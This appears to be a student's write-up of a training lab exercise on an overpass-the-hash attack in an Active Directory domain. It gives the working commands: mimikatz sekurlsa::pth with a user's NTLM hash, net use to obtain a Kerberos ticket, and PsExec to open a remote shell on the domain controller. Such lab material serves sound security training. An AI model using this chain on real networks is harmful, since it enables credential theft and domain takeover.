21.4.2.1

# 21.4.2.1.1. Execute the overpass the hash attack above and gain an interactive command prompt on the domain controller. Make sure to reboot the Windows 10 client before starting the exercise to clear any cached Kerberos tickets.

These are the correct instructions for running as a different user:
1. Open File Explorer and go to the folder which contains the required app.
2. Press and hold the Shift key and right-click on the file.
3. In the context menu, select Run as different user.
4. Enter the new credentials and click OK to run the app.
![e68ddb500e99df85a96d6284da34d5f5.png](30a2796ecf49476aba40fd11a9cf4fe8.png)
![0a68b34cd8e50c6810915eb234b0851f.png](93335755407940fcb438a8b9f1c15af6.png)

We expect that jeff_admin's credentials are cached to the Windows client machine while the notepad application is open. **THE NOTEPAD APPLICATION MUST STAY OPEN.**

Run mimikatz, then run privilege::debug then run the following command to create a new PowerShell process running under the context of Jeff_Admin
`mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:Powershell.exe`
![820a981e802b1e7fee0de1b998d2539b.png](eeabb1e0be204cd691919853cbe177a2.png)

A new Powershell session pops open that allows us to execute commands as Jeff_Admin
![125da66712ef2270188380dafa9a5cf2.png](efd62f033d804067bfe3607e54575748.png)

Run the following in PowerShell to get the cached Kerberos tickets. However we notice that none have been cached since Jeff_Admin has not performed an interactive login. 
`klist`
![6cede937fdc14ee512ffe4b9d401ebb1.png](9e4baccfd60c4939ae4fe39a438204a3.png)

We can generate a TGT by authenticating to a network share on the domain controller with net use
`net use \\dc01`
`klist`
![72de3d14ad3b91af58b3e629b694cd17.png](dc0cd47e5f0e43fb8f4fcd70d9fd306e.png)

We have now converted our NTLM hash into a Kerberos TGT, which allows us to use any tools that rely on Kerberos authentication such as PsExec.

**PsExec can run a command remotely but does not accept password hashes.** Since we have generated Kerberos tickets and operate in the context of Jeff_Admin in the PowerShell session, we may reuse the TGT to obtain code execution on the domain controller.

Let's run PsExec to launch a command prompt remotely on the \dc01 machine as Jeff_Admin. The output shows that we have gained remote code execution.
`PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe`
![a26528c1931eb92416784782719fb376.png](f76b8e54b7f644b5bd8f3cd1a2f630b8.png)
